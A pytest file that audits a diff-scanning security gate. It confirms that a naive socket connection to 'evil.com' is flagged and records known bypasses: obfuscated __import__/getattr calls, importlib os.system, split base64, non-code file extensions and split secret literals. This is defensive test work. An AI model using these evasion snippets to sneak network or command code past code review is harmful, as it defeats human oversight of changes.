"""Adversarial audit of backend/diffgate.py scan() — the deterministic diff gate.

The gate is an intentionally-incomplete heuristic, so these test_CEILING_* tests
PASS: they pin the *known evasion ceiling* (obvious bypasses that the grep-based
triggers cannot see) so a future tightening is measurable. test_CONTROL_*
confirm the naive-malicious path is still caught.
Run: .venv/bin/python -m pytest tests/test_adversarial_diffgate.py -q
"""
from backend import diffgate, secrets as secrets_mod
from backend.config import settings


def _triggers(old, new, path="x.py"):
    return sorted(f["trigger"] for f in diffgate.scan(old, new, path))


# --- CONTROL: the naive reverse shell is caught ------------------------------
def test_CONTROL_plain_socket_exfil_is_flagged():
    mal = 'import socket\ns = socket.socket()\ns.connect(("evil.com", 1337))\n'
    assert "new_import" in _triggers("", mal)
    assert "network_call" in _triggers("", mal)


# --- CEILING: dynamic import + getattr network evade both triggers ------------
def test_CEILING_dynamic_import_and_getattr_network_unflagged():
    ev = ('m = __import__("soc" + "ket")\n'
          'c = getattr(m, "soc" + "ket")()\n'
          'getattr(c, "conn" + "ect")(("evil.com", 1337))\n')
    assert _triggers("", ev) == []          # importlib/__import__/getattr are invisible


def test_CEILING_importlib_import_module_unflagged():
    ev = 'import importlib\nmod = importlib.import_module("os")\nmod.system("id")\n'
    # importlib itself is a benign-looking import; the dangerous call is unseen
    assert _triggers("", ev) == ["new_import"]


# --- CEILING: base64 payload split under the 40-char run threshold ------------
def test_CEILING_split_base64_under_threshold_unflagged():
    blob = 'payload = "' + "A" * 39 + '" + "' + "B" * 39 + '"\n'
    assert "high_entropy" not in _triggers("", blob)


# --- CEILING: whole-gate skip for non-code / executable-but-odd extensions ----
def test_CEILING_non_code_extension_skips_scan():
    mal = 'import socket\ns = socket.socket()\ns.connect(("evil.com", 1337))\n'
    assert _triggers("", mal, "x.py") != []       # flagged as .py
    # identical bytes in a sourceable/executable-but-non-code-ext file: no flags
    assert diffgate.scan("", mal, "exfil.txt") == []
    assert diffgate.scan("", mal, "deploy") == []      # extensionless shell script
    assert diffgate.scan("", mal, "startup.env") == []


# --- CEILING: a secret split across two literals evades the value scan --------
def test_CEILING_secret_split_across_literals_evades_find_in_bytes():
    settings.secrets_path.parent.mkdir(parents=True, exist_ok=True)
    settings.secrets_path.write_text('{"AWS_KEY": "AKIAREALSECRETVALUE99"}')
    whole = b'k = "AKIAREALSECRETVALUE99"\n'
    split = b'k = "AKIARE" + "ALSECRETVALUE99"\n'
    assert secrets_mod.find_in_bytes(whole) == ["AWS_KEY"]   # naive placement caught
    assert secrets_mod.find_in_bytes(split) == []            # split evades


# --- scan() is crash-resistant against hostile inputs ------------------------
def test_CONTROL_scan_does_not_crash_on_pathological_input():
    for new in ("x = '" + "A" * 500_000 + "'",     # huge single line
                "import os\x00socket.socket()",       # embedded NULs
                "impórt sócket " + "\U0001F600" * 500,  # unicode
                "import " + '"' * 20_000):            # regex bait
        diffgate.scan("", new, "x.py")               # must not raise
